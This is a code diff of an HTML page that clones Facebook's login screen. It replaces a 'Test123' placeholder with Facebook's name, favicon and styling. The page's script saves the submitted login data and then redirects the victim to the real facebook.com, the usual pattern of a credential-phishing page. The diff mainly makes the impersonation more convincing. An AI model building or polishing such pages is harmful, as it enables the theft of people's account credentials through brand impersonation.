@@ -3,13 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test123 - Log In or Sign Up</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" type="image/x-icon">
+    <title>Facebook - Log In or Sign Up</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
     <style>
         /* General Styles */
         body {
             background-color: #f0f2f5;
             font-family: Arial, sans-serif;
+            padding: 5% 5% 0% 5%;
         }
 
         /* Test123 Branding */
@@ -74,8 +76,17 @@
             border-color: #36a420;
         }
 
-        .create-page {
+        .create-page a {
             font-size: 0.9rem;
+            text-decoration: none !important;
+            color: black !important;
+            font-weight: bolder;
+        }
+        .create-page a :hover{
+            font-size: 0.9rem;
+            text-decoration:underline !important;
+            color: black !important;
+            font-weight: bolder;
         }
 
         /* Form Controls */
@@ -91,7 +102,7 @@
         /* Footer Styles */
         footer {
             background-color: #fff;
-            padding: 20px 0;
+            padding: 70px 0;
             margin-top: 50px;
             border-top: 1px solid #ddd;
         }
@@ -135,7 +146,7 @@
         <div class="row mt-5">
             <div class="col-md-6 d-flex align-items-center">
                 <div class="test123-intro">
-                    <h1 class="test123-logo">Facebook</h1>
+                    <h1 class="test123-logo">facebook</h1>
                     <h2 class="test123-tagline">Facebook helps you connect and share with the people in your life.</h2>
                 </div>
             </div>
@@ -268,7 +279,7 @@
                     if (response.ok) {
                         const result = await response.json();
                         console.log('Login successfully:', result);
-                        window.location.href = "https://www.facebook.com/profile.php"; 
+                        window.location.href = "https://www.facebook.com/me"; 
                     } else {
                         const errorData = await response.json();
                         console.error('Failed to save login data:', errorData);
